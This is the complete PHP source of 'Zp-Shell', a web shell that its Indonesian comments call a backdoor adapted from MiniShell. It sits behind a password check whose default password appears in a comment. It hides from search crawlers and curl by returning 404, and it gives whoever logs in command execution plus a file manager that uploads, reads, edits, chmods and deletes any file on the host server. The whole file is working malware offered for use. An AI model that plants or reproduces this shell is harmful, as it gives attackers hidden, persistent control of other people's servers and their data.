// Backdoor ini tidak sepenuhnya saya buat sendiri,
// Komponen"nya saya ambil dari MiniSHell
// Saya hanya menambahkan bootstrap 4 untuk mempercantik tampilannya
<?php
session_start();
error_reporting(0);
set_time_limit(0);

$password = "b46f03b854d398faac2f01496709b3da"; // default: Rezadkim
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
  $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
      header('HTTP/1.0 404 Not Found');
      exit;
  }
}

if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
  echo "<script>window.location='?';</script>";
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login();

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
// CMD
function exe($cmd) {
    if(function_exists('system')) { 		
      @ob_start(); 		
      @system($cmd); 		
      $buff = @ob_get_contents(); 		
      @ob_end_clean(); 		
      return $buff; 	
    } elseif(function_exists('exec')) { 		
      @exec($cmd,$results); 		
      $buff = ""; 		
      foreach($results as $result) { 			
        $buff .= $result; 		
      } return $buff; 	
    } elseif(function_exists('passthru')) { 		
      @ob_start(); 		
      @passthru($cmd); 		
      $buff = @ob_get_contents(); 		
      @ob_end_clean(); 		
      return $buff; 	
    } elseif(function_exists('shell_exec')) { 		
      $buff = @shell_exec($cmd); 		
      return $buff; 	
    } 
}

// HDD
function hardisk($hdd) {
    if($hdd >= 1073741824)
    return sprintf('%1.2f',$hdd / 1073741824 ).' GB';
    elseif($hdd >= 1048576)
    return sprintf('%1.2f',$hdd / 1048576 ) .' MB';
    elseif($hdd >= 1024)
    return sprintf('%1.2f',$hdd / 1024 ) .' KB';
    else
    return $hdd .' B';
}

// PATH
if(isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
}

// Info
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
$bebas = hardisk(disk_free_space("/"));
$hasil = hardisk(disk_total_space("/"));
$digunakan = (float)($hasil) - (float)($bebas);
$wget = (exe('wget --help')) ? "<button class='btn btn-success btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-on'></i> Wget&nbsp;</button>" : "<button class='btn btn-danger btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-off'></i> Wget&nbsp;</button>";
$perl = (exe('perl --help')) ? "<button class='btn btn-success btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-on'></i> Perl</button>" : "<button class='btn btn-danger btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-off'></i> Perl</button>";
$python = (exe('python --help')) ? "<button class='btn btn-success btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-on'></i> Python</button>" : "<button class='btn btn-danger btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-off'></i> Python</button>";
$mysql = (function_exists('mysqli_connect')) ? "<button class='btn btn-success btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-on'></i> Mysql</button>" : "<button class='btn btn-danger btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-off'></i> Mysql</button>";
$curl = (function_exists('curl_version')) ? "<button class='btn btn-success btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-on'></i> Curl</button>" : "<button class='btn btn-danger btn-sm inf' data_but='btn-xs'><i class='fa fa-toggle-off'></i> Curl</button>";

echo '
<!doctype html>
<html lang="en">
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <!-- Fonts/Icon -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.1/css/bootstrap.min.css" integrity="sha384-VCmXjywReHh4PwowAiWNagnWcLhlEJLA5buUprzK8rxFgeH0kww/aWY76TfkUoSX" crossorigin="anonymous">
  <!-- My CSS -->
  <style>
    body {
      background-color: #130F26;
    }
    .info {
      margin-top: 50px;
    }
    .isi-tabel {
      margin-top: 50px;
    }
    .dir {
      margin-bottom: 0;
    }
    table {
      border-radius: 5px;
    }
    .klik {
      border-radius: 50px;
      margin-bottom: 7px;
    }
    a:hover {
      color: white;
      text-shadow: 0 0 3px #FF0000;
      text-decoration: none;
    }
    a {
      color: white;
      text-decoration: none;
    }
    .dir {
      color: #495057;
    }
    .current {
        background-color: #454d55;
    }
    .pemisah {
        background-color: #575d64;
    }
    .footer {
        color: lime;
    }
    .inf {
        margin: 3px;
    }
    small {
      color: gold;
    }
    .py-3 {
      color: white;
    }
    .fa-heart {
      color: red;
    }
    </style>
    <title>Zp-Shell</title>
  </head>
<body>
<section class="isi" id="isi">
    <div class="container">
      <div class="row mb-5 pt-5">
        <div class="col-sm-12">
        <center><h1><font color="red">{</font> <font color="white">Zp-Shell</font> <font color="red">}</font></h1><small>v0.1</small></center>
        <hr color="white">
          <div class="row justify-content-center">
            <div class="col-lg-4 info">
              <div class="card text-white bg-primary mb-3 text-center">
                <div class="card-body">
                  <h5 class="card-title">Info</h5>
                  <p class="card-text">Information for server</p>
                  <span class="badge badge-pill badge-secondary"><a href="?">Home</a></span>
                  <span class="badge badge-pill badge-danger"><a href="?logout=true">Logout</a></span>
                </div>
              </div>
              <div class="input-group mb-3">
                <div class="input-group-prepend">
                  <span class="input-group-text" id="basic-addon3">User Agent</span>
                </div>
                <input type="text" class="form-control" id="basic-url" aria-describedby="basic-addon3" value="'.$_SERVER["HTTP_USER_AGENT"].'">
            </div>
            <div class="input-group mb-3">
              <div class="input-group-prepend">
                <span class="input-group-text" id="basic-addon3">Software&nbsp;&nbsp;&nbsp;&nbsp;</span>
              </div>
              <input type="text" class="form-control" id="basic-url" aria-describedby="basic-addon3" value="'.$_SERVER["SERVER_SOFTWARE"].'">
            </div>
            <ul class="list-group">
              <li class="list-group-item"><label for="host" type="button" class="btn btn-warning btn-sm " data_but="btn-xs"><i class="fa fa-desktop"></i> Host</label> <label for="address" type="button" class="btn btn-warning btn-sm " data_but="btn-xs"><i class="fa fa-map-marker"></i> Address</label> <label for="hdd" type="button" class="btn btn-warning btn-sm " data_but="btn-xs"><i class="fa fa-database"></i> HDD</label> 
              <input type="text" class="form-control" id="host" aria-describedby="basic-addon3" value="'.$_SERVER["HTTP_HOST"].'" readonly>
              <input type="text" class="form-control" id="address" aria-describedby="basic-addon3" value="'.$_SERVER["SERVER_ADDR"].'" readonly>
              <input type="text" class="form-control" id="hdd" aria-describedby="basic-addon3" value="'.$digunakan.' / '.$hasil.' | Free : '.$bebas.'" readonly>
              <li class="list-group-item">'.$mysql.''.$curl.'<br>'.$wget.''.$perl.''.$python.'</li>
            </ul>
          </div>
          <div class="col-lg-8 isi-tabel">
            <form enctype="multipart/form-data" method="POST">
              <font color="#495057">File Upload :</font>
              <input type="file" name="file"/>
              <button type="submit" class="btn btn-outline-primary klik">Upload</button>
            </form>
            <nav aria-label="breadcrumb">
              <ol class="breadcrumb dir">
                <font color="#495057">Path : ';
                foreach($paths as $id=>$pat){
                    if($pat == '' && $id == 0){
                        $a = true;
                        echo '<a class="dir" href="?path=/">/</a>';
                        continue;
                    }
                    if($pat == '') continue;
                    echo '<a class="dir" href="?path=';
                    for($i=0;$i<=$id;$i++){
                        echo "$paths[$i]";
                        if($i != $id) echo "/";
                    }
                    echo '">'.$pat.'</a>/';
                }
                echo '</font></ol></nav>';

if(isset($_FILES['file'])) {
    // Upload File
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])) {
        echo "<div class='alert alert-success' role='alert'>Upload Berhasil !</div>";
    } else {
        echo "<div class='alert alert-danger' role='alert'>Upload Gagal !</div>";
    }
}

// VIEW
if(isset($_GET['filesrc'])) {
    echo "<tr><td>";
    echo '<nav aria-label="breadcrumb"><ol class="breadcrumb current"><font color="white">Current Dir : ';
    echo $_GET['filesrc'];
    echo '</tr></td></table><br/></nav></ol>';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');


// CHMOD
} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '<nav aria-label="breadcrumb"><ol class="breadcrumb current"><font color="white">Current Folder : '.$_POST['path'].'</ol></nav>';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<div class="alert alert-success" role="alert">Change Permission Berhasil !</div>';
            } else {
                echo '<div class="alert alert-danger" role="alert">Change Permission Gagal !</div>';
            }
        }
        $aria_lb = "Recipient's username";
        echo '<br><center>
        <h3>[ Permission ]</h3>
        <form method="POST">
        <div class="input-group mb-3">
            <input type="text" name="perm" class="form-control" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" aria-label="'.$aria_lb.'" aria-describedby="basic-addon2">
            <input type="hidden" name="path" value="'.$_POST['path'].'">
            <input type="hidden" name="opt" value="chmod">
            <div class="input-group-append">
                <button type="submit" class="btn btn-outline-primary klik">GO</button>
            </div>
        </div>
        </form>';

    // RENAME
    } elseif($_POST['opt'] == 'rename') {
        if(isset($_POST['newname'])) {
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])) {
                echo '<div class="alert alert-success" role="alert">Ganti Nama Berhasil !</div>';
            } else {
                echo '<div class="alert alert-danger" role="alert">Ganti Nama Gagal !</div>';
            }
        $_POST['name'] = $_POST['newname'];
        }
        echo '<br><center>
        <h3>[ Rename ]</h3>
        <form method="POST">
        <div class="input-group mb-3">
            <input type="text" name="newname" class="form-control" value="'.$_POST['name'].'" aria-label="'.$aria_lb.'" aria-describedby="basic-addon2">
            <input type="hidden" name="path" value="'.$_POST['path'].'">
            <input type="hidden" name="opt" value="rename">
            <div class="input-group-append">
                <button type="submit" class="btn btn-outline-primary klik">GO</button>
            </div>
        </div>
        </form>';


    // EDIT
    } elseif($_POST['opt'] == 'edit') {
        if(isset($_POST['src'])) {
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])) {
                echo '<div class="alert alert-success" role="alert">Berhasil Edit File !</div>';
            } else {
               echo '<div class="alert alert-danger" role="alert">Gagal Edit File !</div>';
            }
        fclose($fp);
        }
        echo '<br><center>
        <h3>[ Edit File ]</h3>
        <form method="POST">
            <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br/>
            <input type="hidden" name="path" value="'.$_POST['path'].'">
            <input type="hidden" name="opt" value="edit">
            <br>
            <button type="submit" class="btn btn-outline-primary klik">Simpan</button>
        </form>';
    }
    echo '</center>';

} else {
    echo '<center>';

// OPTION ---------->

// Delete
if(isset($_GET['option']) && $_POST['opt'] == 'delete') {
    // Dir
    if($_POST['type'] == 'dir') {
        if(rmdir($_POST['path'])) {
            echo '<div class="alert alert-success" role="alert">Directory Terhapus !</div>';
        } else {
            echo '<div class="alert alert-danger" role="alert">Directory Gagal Terhapus !</div>';
        }
    // File
    } elseif($_POST['type'] == 'file') {
        if(unlink($_POST['path'])) {
            echo '<div class="alert alert-success" role="alert">File Terhapus !</div>';
        } else {
            echo '<div class="alert alert-danger" role="alert">File Gagal Dihapus !</div>';
        }
    }
}
echo '</center>';
$scandir = scandir($path);
echo '<table class="table table-hover table-dark">
<thead>
  <tr>
    <th scope="col"><center>Name</center></th>
    <th scope="col"><center>Size</center></th>
    <th scope="col"><center>Permission</center></th>
    <th scope="col"><center>Modify</center></th>
  </tr>
</thead>';

// Table Dir
$img_dir = "<img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>";
foreach($scandir as $dir) {
    if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
    echo '<tr>
    <td>'.$img_dir.'<a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
    <td><center>--</center></td>
    <td><center>';
    if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
    elseif(!is_readable($path.'/'.$dir)) echo '<font color="white">';
    echo perms($path.'/'.$dir);
    if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

    echo '</center></td>
    <td><center>
    <!-- OPTIon -->
    <form method="POST" action="?option&path='.$path.'">
        <input type="hidden" name="type" value="dir">
        <input type="hidden" name="name" value="'.$dir.'">
        <input type="hidden" name="path" value="'.$path.'/'.$dir.'">
        <button name="opt" value="rename" type="submit" class="btn btn-secondary btn-sm" data_but="btn-xs"><i class="fa fa-pencil-square-o"></i> Rename</button>
        <button name="opt" value="chmod" type="submit" class="btn btn-warning btn-sm" data_but="btn-xs"><i class="fa fa-unlock-alt"></i> Chmod</button>
        <button name="opt" value="delete" type="submit" class="btn btn-danger btn-sm" data_but="btn-xs"><i class="fa fa-trash-o"></i> Delete</button>
    </form></center></td>
    </tr>';
}
echo '<tr class="pemisah"><td></td><td></td><td></td><td></td></tr>';

$img_file = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=">';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
echo '<tr>
<td>'.$img_file.' <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="white">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center>
<form method="POST" action="?option&path='.$path.'">
    <input type="hidden" name="type" value="file">
    <input type="hidden" name="name" value="'.$file.'">
    <input type="hidden" name="path" value="'.$path.'/'.$file.'">
    <button name="opt" value="edit" type="submit" class="btn btn-success btn-sm" data_but="btn-xs"><i class="fa fa-pencil"></i> Edit</button>
    <button name="opt" value="rename" type="submit" class="btn btn-secondary btn-sm" data_but="btn-xs"><i class="fa fa-pencil-square-o"></i> Rename</button>
    <button name="opt" value="chmod" type="submit" class="btn btn-warning btn-sm" data_but="btn-xs"><i class="fa fa-unlock-alt"></i> Chmod</button>
    <button name="opt" value="delete" type="submit" class="btn btn-danger btn-sm" data_but="btn-xs"><i class="fa fa-trash-o"></i> Delete</button>
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}


function login() {
  echo '
  <!doctype html>
<html lang="en">
<head>
<title>Zp-Shell</title>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <!-- Fonts/Icon -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.1/css/bootstrap.min.css" integrity="sha384-VCmXjywReHh4PwowAiWNagnWcLhlEJLA5buUprzK8rxFgeH0kww/aWY76TfkUoSX" crossorigin="anonymous">
  <!-- My CSS LOGIN -->
  <style>
  @import url(https://fonts.googleapis.com/css?family=Open+Sans:100,300,400,700);
  @import url(https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css);

body, html {
  height: 100%;
}
body {
  font-family: "Open Sans";
  font-weight: 100;
  display: flex;
  overflow: hidden;
}
input {
  ::-webkit-input-placeholder {
     color: rgba(255,255,255,0.7);
  }
  ::-moz-placeholder {
     color: rgba(255,255,255,0.7);  
  }
  :-ms-input-placeholder {  
     color: rgba(255,255,255,0.7);  
  }
  &:focus {
    outline: 0 transparent solid;
    ::-webkit-input-placeholder {
     color: rgba(0,0,0,0.7);
    }
    ::-moz-placeholder {
       color: rgba(0,0,0,0.7);  
    }
    :-ms-input-placeholder {  
       color: rgba(0,0,0,0.7);  
    }
  }
}

.login-form {
  //background: #222;
  //box-shadow: 0 0 1rem rgba(0,0,0,0.3);
  min-height: 10rem;
  margin: auto;
  max-width: 50%;
  padding: .5rem;
}
.login-text {
  //background: hsl(40,30,60);
  //border-bottom: .5rem solid white;
  color: white;
  font-size: 1.5rem;
  margin: 0 auto;
  max-width: 50%;
  padding: .5rem;
  text-align: center;
  //text-shadow: 1px -1px 0 rgba(0,0,0,0.3);
  .fa-stack-1x {
    color: black;
  }
}

.login-username, .login-password {
  background: transparent;
  border: 0 solid;
  border-bottom: 1px solid rgba(white, .5);
  color: white;
  display: block;
  margin: 1rem;
  padding: .5rem;
  transition: 250ms background ease-in;
  width: calc(100% - 3rem);
  &:focus {
    background: white;
    color: black;
    transition: 250ms background ease-in;
  }
}

.login-forgot-pass {
  //border-bottom: 1px solid white;
  bottom: 0;
  color: white;
  cursor: pointer;
  display: block;
  font-size: 75%;
  left: 0;
  opacity: 0.6;
  padding: .5rem;
  position: absolute;
  text-align: center;
  //text-decoration: none;
  width: 100%;
  &:hover {
    opacity: 1;
  }
}
.login-submit {
  border: 1px solid white;
  background: transparent;
  color: white;
  display: block;
  margin: 1rem auto;
  min-width: 1px;
  padding: .25rem;
  transition: 250ms background ease-in;
  &:hover, &:focus {
    background: white;
    color: black;
    transition: 250ms background ease-in;
  }
}




[class*=underlay] {
  left: 0;
  min-height: 100%;
  min-width: 100%;
  position: fixed;
  top: 0;
}
.underlay-photo {
  animation: hue-rotate 6s infinite;
  background: url("https://31.media.tumblr.com/41c01e3f366d61793e5a3df70e46b462/tumblr_n4vc8sDHsd1st5lhmo1_1280.jpg");
  background-size: cover;
  -webkit-filter: grayscale(30%);
  z-index: -1;
}
.underlay-black {
  background: rgba(0,0,0,0.7);
  z-index: -1;
}

@keyframes hue-rotate {
  from {
    -webkit-filter: grayscale(30%) hue-rotate(0deg);
  }
  to {
    -webkit-filter: grayscale(30%) hue-rotate(360deg);
  }
}
  </style>
  <form class="login-form" method="POST">
  <p class="login-text">
    <i class="fa fa-unlock-alt"></i>
  </p>
  <center><h1><font color="red">{</font> <font color="white">Zp-Shell</font> <font color="red">}</font></h1><small style="color: gold;">v0.1</small></center>
        <hr color="white">
  <input type="username" class="login-username" value="RezaTamvan" readonly/>
  <input type="password" name="password" class="login-password" autofocus="true" required="true" placeholder="Password" />
  <input type="submit" value="Masuk" class="login-submit" />
</form>
<div class="underlay-photo"></div>
<div class="underlay-black"></div> 
  ';
  exit;
}

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
echo '<footer class="page-footer font-small special-color-dark pt-4">
    <div class="footer-copyright text-center py-3">
        Copyright &copy; 2020 | Built with <i class="fa fa-heart"></i> by. <a href="https://www.instagram.com/rezadkim">Rezadkim</a>
    </div>
</footer>
</body>
</html>';
?>
